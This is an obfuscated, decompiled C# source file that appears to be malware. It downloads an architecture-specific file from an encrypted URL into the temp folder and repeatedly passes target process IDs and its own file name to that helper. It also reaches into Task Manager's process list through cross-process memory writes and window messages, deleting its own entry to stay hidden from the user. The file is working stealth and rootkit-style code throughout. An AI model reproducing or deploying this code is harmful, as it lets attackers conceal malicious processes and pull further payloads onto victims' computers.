using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ybfSLIGKlaODvJ;

internal sealed class sZZiKvvuSOPcQ
{
	private struct tXjSqvmbMXL
	{
		public uint saimxreRuqXYfeD;

		public IntPtr RKHKTvafzFnm;

		public IntPtr wuUchOoyfdzEPPn;

		public uint IqzjgDIHedqHUuB;

		public uint CzUqTbvmxmjB;

		public IntPtr HiTqTGReVggA;

		public uint DnupImjlMHIAU;

		public int OyNlAkiwkiOu;

		public IntPtr XvoqiPcLoXxyZ;
	}

	private static volatile bool BJtCfqCFCAM;

	public static volatile bool VtXFQsrxPv;

	[NonSerialized]
	internal static GetString getString_0;

	public static string IVwddYTQTbwf()
	{
		if (IntPtr.Size == 8)
		{
			iWNOuKBWgwsf.hVHAamgGKApycpVZ = ypCQnqWmFcu(new Uri(iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400154))));
		}
		else
		{
			iWNOuKBWgwsf.hVHAamgGKApycpVZ = ypCQnqWmFcu(new Uri(iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107399976))));
		}
		return iWNOuKBWgwsf.hVHAamgGKApycpVZ;
	}

	public static string ypCQnqWmFcu(Uri uri_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(getString_0(107403297), getString_0(107390190)).Remove(0, 3) + getString_0(107403292);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process BfKcWLLpmimyR(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(string_0))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void oetkkjIFJK(string[] string_0)
	{
		string text = IVwddYTQTbwf();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string string_ in string_0)
			{
				Process process = BfKcWLLpmimyR(string_);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					iWNOuKBWgwsf.iDwobxXLVYBDUs(text, text2 + getString_0(107389071) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					iWNOuKBWgwsf.iDwobxXLVYBDUs(text, text2 + getString_0(107389071) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + getString_0(107400374));
					iWNOuKBWgwsf.iDwobxXLVYBDUs(text, text2 + getString_0(107389071) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400333)));
					iWNOuKBWgwsf.iDwobxXLVYBDUs(text, text2 + getString_0(107389071) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107389097)));
					iWNOuKBWgwsf.iDwobxXLVYBDUs(text, text2 + getString_0(107389071) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400340)));
					iWNOuKBWgwsf.iDwobxXLVYBDUs(text, text2 + getString_0(107389071) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400323)));
					iWNOuKBWgwsf.iDwobxXLVYBDUs(text, text2 + getString_0(107389071) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107403558)));
					iWNOuKBWgwsf.iDwobxXLVYBDUs(text, text2 + getString_0(107389071) + iWNOuKBWgwsf.HnrHiFTDAEzVb(getString_0(107400274)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_0, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr oyIjeoddxPWGmN);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr XdILPmuEDZOFQLS, IntPtr IAWOomZzsqWaUz, byte[] ActHPTgsROpuJ, uint zpKvlWkJxIqs, out UIntPtr AealBuiGfy);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr ZDyUONcIwz, IntPtr AZDtvrTOguFSAq, [Out] byte[] yOrNcivMBZCe, int LSqKUqgugUMaWu, out UIntPtr xYDZxRJZnhgZfW);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr KybiPguTRRo, out uint LcTMsskndhQ);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] XqLeZzlQhAbF(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr udCJNItnJKnQO(uint uint_0)
	{
		return OpenProcess(56, bool_0: false, uint_0);
	}

	private static void SsreeiVQsoZIEHgxd(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr HKtEyzzdeQLlRb(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void yvYHxXmPjvdb(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr dkTxeivogl()
	{
		IntPtr intPtr = FindWindow(getString_0(107400289), getString_0(107400232));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow(getString_0(107400199), getString_0(107400222));
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107400199), null);
			return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107400173), getString_0(107400184));
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, getString_0(107400199), null);
		return FindWindowEx(intPtr, IntPtr.Zero, getString_0(107400173), getString_0(107399627));
	}

	private static IntPtr uPqNGcvFlolN(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void xVaBRBkVenwRZR(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void vowlumaeaLtV(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string NmBmCUUrELXZRoy(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		tXjSqvmbMXL tXjSqvmbMXL = default(tXjSqvmbMXL);
		GetWindowThreadProcessId(intptr_0, out var LcTMsskndhQ);
		IntPtr intPtr = udCJNItnJKnQO(LcTMsskndhQ);
		IntPtr intPtr2 = HKtEyzzdeQLlRb((uint)Marshal.SizeOf(tXjSqvmbMXL), intPtr);
		IntPtr intPtr3 = HKtEyzzdeQLlRb(50u, intPtr);
		tXjSqvmbMXL.RKHKTvafzFnm = intptr_1;
		tXjSqvmbMXL.wuUchOoyfdzEPPn = (IntPtr)0;
		tXjSqvmbMXL.DnupImjlMHIAU = 50u;
		tXjSqvmbMXL.HiTqTGReVggA = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, XqLeZzlQhAbF(tXjSqvmbMXL), (uint)Marshal.SizeOf(tXjSqvmbMXL), out var AealBuiGfy);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out AealBuiGfy);
		yvYHxXmPjvdb(intPtr, intPtr2, (uint)Marshal.SizeOf(tXjSqvmbMXL));
		yvYHxXmPjvdb(intPtr, intPtr3, 50u);
		SsreeiVQsoZIEHgxd(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void mEDePexPcyM(string string_0)
	{
		IntPtr intPtr = dkTxeivogl();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)uPqNGcvFlolN(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = NmBmCUUrELXZRoy(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				xVaBRBkVenwRZR(intPtr, (IntPtr)i);
			}
		}
	}

	private static void qdEYLuxDOz()
	{
		IntPtr intPtr = dkTxeivogl();
		if (intPtr != IntPtr.Zero)
		{
			vowlumaeaLtV(intPtr);
			vowlumaeaLtV(intPtr);
			vowlumaeaLtV(intPtr);
			vowlumaeaLtV(intPtr);
			vowlumaeaLtV(intPtr);
		}
	}

	public static void YGolGtVNyThd()
	{
		Thread thread = new Thread(bGEGtPAzaGT);
		thread.Start();
	}

	private static void bGEGtPAzaGT()
	{
		while (!BJtCfqCFCAM)
		{
			if (VtXFQsrxPv)
			{
				mEDePexPcyM(Process.GetCurrentProcess().ProcessName + getString_0(107403292));
				Thread.Sleep(525);
			}
			else
			{
				qdEYLuxDOz();
				Thread.Sleep(1000);
			}
		}
		BJtCfqCFCAM = false;
	}

	static sZZiKvvuSOPcQ()
	{
		Strings.CreateGetStringDelegate(typeof(sZZiKvvuSOPcQ));
		BJtCfqCFCAM = false;
		VtXFQsrxPv = true;
	}
}
